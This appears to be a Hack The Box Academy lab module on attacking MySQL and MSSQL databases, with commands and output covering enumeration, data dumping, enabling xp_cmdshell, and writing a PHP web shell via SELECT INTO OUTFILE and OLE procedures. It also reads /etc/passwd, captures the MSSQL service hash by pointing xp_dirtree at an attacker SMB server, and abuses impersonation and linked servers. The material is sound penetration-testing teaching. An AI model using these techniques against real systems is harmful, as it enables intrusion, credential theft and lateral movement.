
<h1>Attacking SQL Databases</h1>
<hr/>
<p><a href="https://www.mysql.com/">MySQL</a> and <a href="https://www.microsoft.com/en-us/sql-server/sql-server-2019">Microsoft SQL Server</a> (<code>MSSQL</code>) are <a href="https://en.wikipedia.org/wiki/Relational_database">relational database</a> management systems that store data in tables, columns, and rows. Many relational database systems like MSSQL &amp; MySQL use the <a href="https://en.wikipedia.org/wiki/SQL">Structured Query Language</a> (<code>SQL</code>) for querying and maintaining the database.</p>
<p>Databases hosts are considered to be high targets since they are responsible for storing all kinds of sensitive data, including, but not limited to, user credentials, <code>Personal Identifiable Information (PII)</code>, business-related data, and payment information. In addition, those services often are configured with highly privileged users. If we gain access to a database, we may be able to leverage those privileges for more actions, including lateral movement and privilege escalation.</p>
<hr/>
<h2>Enumeration</h2>
<p>By default, MSSQL uses ports <code>TCP/1433</code> and <code>UDP/1434</code>, and MySQL uses <code>TCP/3306</code>. However, when MSSQL operates in a "hidden" mode, it uses the <code>TCP/2433</code> port. We can use  <code>Nmap</code>'s default scripts <code>-sC</code> option to enumerate database services on a target system:</p>
<h4>Banner Grabbing</h4>
<pre><code class="language-shell-session">[!bash!]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
</code></pre>
<p>The Nmap scan reveals essential information about the target, like the version and hostname, which we can use to identify common misconfigurations, specific attacks, or known vulnerabilities. Let's explore some common misconfigurations and protocol specifics attacks.</p>
<hr/>
<h2>Authentication Mechanisms</h2>
<p><code>MSSQL</code> supports two <a href="https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server">authentication modes</a>, which means that users can be created in Windows or the SQL Server:</p>
<table>
<thead>
<tr>
<th><strong>Authentication Type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Windows authentication mode</code></td>
<td>This is the default, often referred to as <code>integrated</code> security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.</td>
</tr>
<tr>
<td><code>Mixed mode</code></td>
<td>Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.</td>
</tr>
</tbody>
</table>
<p><code>MySQL</code> also supports different <a href="https://dev.mysql.com/doc/internals/en/authentication-method.html">authentication methods</a>, such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode">choose an authentication mode</a> for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.</p>
<p>In the past, there was a vulnerability <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass">CVE-2012-2122</a> in <code>MySQL 5.6.x</code> servers, among others, that allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the <code>timing attack</code> vulnerability existed in the way MySQL handled authentication attempts.</p>
<p>In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure.</p>
<p>In the case of <code>MySQL 5.6.x</code>, the server takes longer to respond to an incorrect password than to a correct one. Thus, if we repeatedly try to authenticate with the same incorrect password, we will eventually receive a response indicating that the correct password was found, even though it was not.</p>
<h4>Misconfigurations</h4>
<p>Misconfigured authentication in SQL Server can let us access the service without credentials if anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.</p>
<h4>Privileges</h4>
<p>Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:</p>
<ul>
<li>
<p>Read or change the contents of a database</p>
</li>
<li>
<p>Read or change the server configuration</p>
</li>
<li>
<p>Execute commands</p>
</li>
<li>
<p>Read local files</p>
</li>
<li>
<p>Communicate with other databases</p>
</li>
<li>
<p>Capture the local system hash</p>
</li>
<li>
<p>Impersonate existing users</p>
</li>
<li>
<p>Gain access to other networks</p>
</li>
</ul>
<p>In this section, we will explore some of these attacks.</p>
<hr/>
<h2>Protocol Specific Attacks</h2>
<p>It is crucial to understand how SQL syntax works. We can use the free <a href="https://academy.hackthebox.com/course/preview/sql-injection-fundamentals">SQL Injection Fundamentals</a> module to introduce ourselves to SQL syntax. Even though this module covers MySQL, MSSQL and MySQL syntax are pretty similar.</p>
<h4>Read/Change the Database</h4>
<p>Let's imagine we gained access to a SQL Database. First, we need to identify existing databases on the server, what tables the database contains, and finally, the contents of each table. Keep in mind that we may find databases with hundreds of tables. If our goal is not just getting access to the data, we will need to pick which tables may contain interesting information to continue our attacks, such as usernames and passwords, tokens, configurations, and more. Let's see how we can do this:</p>
<h4>MySQL - Connecting to the SQL Server</h4>
<pre><code class="language-shell-session">[!bash!]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]&gt;
</code></pre>
<h4>Sqlcmd - Connecting to the SQL Server</h4>
<pre><code class="language-cmd-session">C:\htb&gt; sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1&gt;
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> When we authenticate to MSSQL using <code>sqlcmd</code> we can use the parameters <code>-y</code> (SQLCMDMAXVARTYPEWIDTH) and <code>-Y</code> (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance. </p>
</div>
</div>
<p>If we are targetting <code>MSSQL</code> from Linux, we can use <code>sqsh</code> as an alternative to <code>sqlcmd</code>:</p>
<pre><code class="language-shell-session">[!bash!]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1&gt;
</code></pre>
<p>Alternatively, we can use the tool from Impacket with the name <code>mssqlclient.py</code>.</p>
<pre><code class="language-shell-session">[!bash!]$ mssqlclient.py -p 1433 <a class="__cf_email__" data-cfemail="b0dac5dcd9dff081809e8182899e8280839e87" href="/cdn-cgi/l/email-protection">[email protected]</a> 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL&gt; 
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> When we authenticate to MSSQL using <code>sqsh</code> we can use the parameters <code>-h</code> to disable headers and footers for a cleaner look.</p>
</div>
</div>
<p>When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use <code>SERVERNAME\\accountname</code> or <code>.\\accountname</code>. The full command would look like:</p>
<pre><code class="language-shell-session">[!bash!]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1&gt;
</code></pre>
<h4>SQL Default Databases</h4>
<p>Before we explore using SQL syntax, it is essential to know the default databases for <code>MySQL</code> and <code>MSSQL</code>. Those databases hold information about the database itself and help us enumerate database names, tables, columns,  etc. With access to those databases, we can use some system stored procedures, but they usually don't contain company data.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> We will get an error if we try to list or connect to a database we don't have permissions to.</p>
</div>
</div>
<p><code>MySQL</code> default system schemas/databases:</p>
<ul>
<li>
<code>mysql</code> - is the system database that contains tables that store information required by the MySQL server</li>
<li>
<code>information_schema</code> - provides access to database metadata</li>
<li>
<code>performance_schema</code> - is a feature for monitoring MySQL Server execution at a low level</li>
<li>
<code>sys</code> - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema</li>
</ul>
<p><code>MSSQL</code> default system schemas/databases:</p>
<ul>
<li>
<code>master</code> - keeps the information for an instance of SQL Server.</li>
<li>
<code>msdb</code> - used by SQL Server Agent.</li>
<li>
<code>model</code> - a template database copied for each new database.</li>
<li>
<code>resource</code> - a read-only database that keeps system objects visible in every database on the server in sys schema.</li>
<li>
<code>tempdb</code> - keeps temporary objects for SQL queries.</li>
</ul>
<h4>SQL Syntax</h4>
<h4>Show Databases</h4>
<pre><code class="language-shell-session">mysql&gt; SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
</code></pre>
<p>If we use <code>sqlcmd</code>, we will need to use <code>GO</code> after our query to execute the SQL syntax.</p>
<pre><code class="language-cmd-session">1&gt; SELECT name FROM master.dbo.sysdatabases
2&gt; GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
</code></pre>
<h4>Select a Database</h4>
<pre><code class="language-shell-session">mysql&gt; USE htbusers;

Database changed
</code></pre>
<pre><code class="language-cmd-session">1&gt; USE htbusers
2&gt; GO

Changed database context to 'htbusers'.
</code></pre>
<h4>Show Tables</h4>
<pre><code class="language-shell-session">mysql&gt; SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
</code></pre>
<pre><code class="language-cmd-session">1&gt; SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2&gt; GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
</code></pre>
<h4>Select all Data from Table "users"</h4>
<pre><code class="language-shell-session">mysql&gt; SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
</code></pre>
<pre><code class="language-cmd-session">1&gt; SELECT * FROM users
2&gt; go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
</code></pre>
<hr/>
<h2>Execute Commands</h2>
<p><code>Command execution</code> is one of the most desired capabilities when attacking common services because it allows us to control the operating system. If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.</p>
<p><code>MSSQL</code> has a <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15">extended stored procedures</a> called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a> which allow us to execute system commands using SQL. Keep in mind the following about <code>xp_cmdshell</code>:</p>
<ul>
<li>
<code>xp_cmdshell</code> is a powerful feature and disabled by default. <code>xp_cmdshell</code> can be enabled and disabled by using the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration">Policy-Based Management</a> or by executing <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option">sp_configure</a>
</li>
<li>The Windows process spawned by <code>xp_cmdshell</code> has the same security rights as the SQL Server service account</li>
<li>
<code>xp_cmdshell</code> operates synchronously. Control is not returned to the caller until the command-shell command is completed</li>
</ul>
<p>To execute commands using SQL syntax on MSSQL, use:</p>
<h4>XP_CMDSHELL</h4>
<pre><code class="language-cmd-session">1&gt; xp_cmdshell 'whoami'
2&gt; GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
</code></pre>
<p>If <code>xp_cmdshell</code> is not enabled, we can enable it, if we have the appropriate privileges, using the following command:</p>
<pre><code class="language-MSSQL">-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
</code></pre>
<p>There are other methods to get command execution, such as adding <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server">extended stored procedures</a>, <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">CLR Assemblies</a>, <a href="https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15">SQL Server Agent Jobs</a>, and <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql">external scripts</a>. However, besides those methods there are also additional functionalities that can be used like the <code>xp_regwrite</code> command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.</p>
<p><code>MySQL</code> supports <a href="https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/">User Defined Functions</a> which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this <a href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repository</a>. It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.</p>
<hr/>
<h2>Write Local Files</h2>
<p><code>MySQL</code> does not have a stored procedure like <code>xp_cmdshell</code>, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose <code>MySQL</code> operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using <a href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a> in the webserver directory. Then we can browse to the location where the file is and execute our commands.</p>
<h4>MySQL - Write Local File</h4>
<pre><code class="language-shell-session">mysql&gt; SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
</code></pre>
<p>In <code>MySQL</code>, a global system variable <a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv">secure_file_priv</a> limits the effect of data import and export operations, such as those performed by the <code>LOAD DATA</code> and <code>SELECT … INTO OUTFILE</code> statements and the <a href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file">LOAD_FILE()</a> function. These operations are permitted only to users who have the <a href="https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file">FILE</a> privilege.</p>
<p><code>secure_file_priv</code> may be set as follows:</p>
<ul>
<li>If empty, the variable has no effect, which is not a secure setting.</li>
<li>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.</li>
<li>If set to NULL, the server disables import and export operations.</li>
</ul>
<p>In the following example, we can see the <code>secure_file_priv</code> variable is empty, which means we can read and write data using <code>MySQL</code>:</p>
<h4>MySQL - Secure File Privileges</h4>
<pre><code class="language-shell-session">mysql&gt; show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
</code></pre>
<p>To write files using <code>MSSQL</code>, we need to enable <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option">Ole Automation Procedures</a>, which requires admin privileges, and then execute some stored procedures to create the file:</p>
<h4>MSSQL - Enable Ole Automation Procedures</h4>
<pre><code class="language-cmd-session">1&gt; sp_configure 'show advanced options', 1
2&gt; GO
3&gt; RECONFIGURE
4&gt; GO
5&gt; sp_configure 'Ole Automation Procedures', 1
6&gt; GO
7&gt; RECONFIGURE
8&gt; GO
</code></pre>
<h4>MSSQL - Create a File</h4>
<pre><code class="language-cmd-session">1&gt; DECLARE @OLE INT
2&gt; DECLARE @FileID INT
3&gt; EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4&gt; EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5&gt; EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET["c"]);?&gt;'
6&gt; EXECUTE sp_OADestroy @FileID
7&gt; EXECUTE sp_OADestroy @OLE
8&gt; GO
</code></pre>
<hr/>
<h2>Read Local Files</h2>
<p>By default, <code>MSSQL</code> allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:</p>
<h4>Read Local Files in MSSQL</h4>
<pre><code class="language-cmd-session">1&gt; SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2&gt; GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
</code></pre>
<p>As we previously mentioned, by default a <code>MySQL</code> installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:</p>
<h4>MySQL - Read Local Files in MySQL</h4>
<pre><code class="language-shell-session">mysql&gt; select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

&lt;SNIP&gt;
</code></pre>
<hr/>
<h2>Capture MSSQL Service Hash</h2>
<p>In the <code>Attacking SMB</code> section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p>
<p>To make this work, we need first to start <a href="https://github.com/lgandx/Responder">Responder</a> or <a href="https://github.com/SecureAuthCorp/impacket">impacket-smbserver</a> and execute one of the following SQL queries:</p>
<h4>XP_DIRTREE Hash Stealing</h4>
<pre><code class="language-cmd-session">1&gt; EXEC master..xp_dirtree '\\10.10.110.17\share\'
2&gt; GO

subdirectory    depth
--------------- -----------
</code></pre>
<h4>XP_SUBDIRS Hash Stealing</h4>
<pre><code class="language-cmd-session">1&gt; EXEC master..xp_subdirs '\\10.10.110.17\share\'
2&gt; GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
</code></pre>
<p>If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.</p>
<h4>XP_SUBDIRS Hash Stealing with Responder</h4>
<pre><code class="language-shell-session">[!bash!]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
&lt;SNIP&gt;

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
</code></pre>
<h4>XP_SUBDIRS Hash Stealing with impacket</h4>
<pre><code class="language-shell-session">[!bash!]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
</code></pre>
<hr/>
<h2>Impersonate Existing Users with MSSQL</h2>
<p>SQL Server has a special permission, named <code>IMPERSONATE</code>, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the <code>IMPERSONATE</code> privilege can lead to privilege escalation in SQL Server.</p>
<p>First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:</p>
<h4>Identify Users that We Can Impersonate</h4>
<pre><code class="language-cmd-session">1&gt; SELECT distinct b.name
2&gt; FROM sys.server_permissions a
3&gt; INNER JOIN sys.server_principals b
4&gt; ON a.grantor_principal_id = b.principal_id
5&gt; WHERE a.permission_name = 'IMPERSONATE'
6&gt; GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
</code></pre>
<p>To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:</p>
<h4>Verifying our Current User and Role</h4>
<pre><code class="language-cmd-session">1&gt; SELECT SYSTEM_USER
2&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
3&gt; go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
</code></pre>
<p>As the returned value <code>0</code> indicates, we do not have the sysadmin role, but we can impersonate the <code>sa</code> user. Let us impersonate the user and execute the same commands. To impersonate a user, we can use the Transact-SQL statement <code>EXECUTE AS LOGIN</code> and set it to the user we want to impersonate.</p>
<h4>Impersonating the SA User</h4>
<pre><code class="language-cmd-session">1&gt; EXECUTE AS LOGIN = 'sa'
2&gt; SELECT SYSTEM_USER
3&gt; SELECT IS_SRVROLEMEMBER('sysadmin')
4&gt; GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> It's recommended to run <code>EXECUTE AS LOGIN</code> within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using <code>USE master</code>.</p>
</div>
</div>
<p>We can now execute any command as a sysadmin as the returned value <code>1</code> indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement <code>REVERT</code>.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.</p>
</div>
</div>
<hr/>
<h2>Communicate with Other Databases with MSSQL</h2>
<p><code>MSSQL</code> has a configuration option called <a href="https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine">linked servers</a>. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.</p>
<p>If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server. Administrators can configure a linked server using credentials from the remote server. If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance. Let's see how we can identify and execute queries on linked servers.</p>
<h4>Identify linked Servers in MSSQL</h4>
<pre><code class="language-cmd-session">1&gt; SELECT srvname, isremote FROM sysservers
2&gt; GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
</code></pre>
<p>As we can see in the query's output, we have the name of the server and the column <code>isremote</code>, where <code>1</code> means is a remote server, and <code>0</code> is a linked server. We can see <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql">sysservers Transact-SQL</a> for more information.</p>
<p>Next, we can attempt to identify the user used for the connection and its privileges. The <a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql">EXECUTE</a> statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (<code>[ ]</code>).</p>
<pre><code class="language-cmd-session">1&gt; EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2&gt; GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).</p>
</div>
</div>
<p>As we have seen, we can now execute queries with sysadmin privileges on the linked server. As <code>sysadmin</code>, we control the SQL Server instance. We can read data from any database or execute system commands with <code>xp_cmdshell</code>. This section covered some of the most common ways to attack SQL Server and MySQL databases during penetration testing engagements. There are other methods for attacking these database types as well as others, such as <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql">PostGreSQL</a>, SQLite, Oracle, <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database">Firebase</a>, and <a href="https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb">MongoDB</a> which will be covered in other modules. It is worth taking some time to read up on these database technologies and some of the common ways to attack them as well.</p>
<div class="my-3 p-3 vpn-switch-card" id="vpn-switch">
<p class="font-size-14 color-white mb-0">VPN Servers</p>
<p class="font-size-13 mb-0">
<i class="fas fa-exclamation-triangle text-warning"></i><span class="color-white ml-1">Warning:</span> Each
                    time you "Switch",
                    your connection keys are regenerated and you must re-download your VPN connection file.
                </p>
<p class="font-size-13 mb-0">
                    All VM instances associated with the old VPN Server will be terminated when switching to
                    a new VPN server. <br/>
                    Existing PwnBox instances will automatically switch to the new VPN server.</p>
<div class="row mb-3">
<div class="col-12 mt-2">
<div class="d-none justify-content-center vpn-loader">
<div class="spinner-border text-success" role="status">
<span class="sr-only">Switching VPN...</span>
</div>
</div>
<select aria-label="vpn server" class="selectpicker custom-form-control vpnSelector badge-select" title="Select VPN Server">
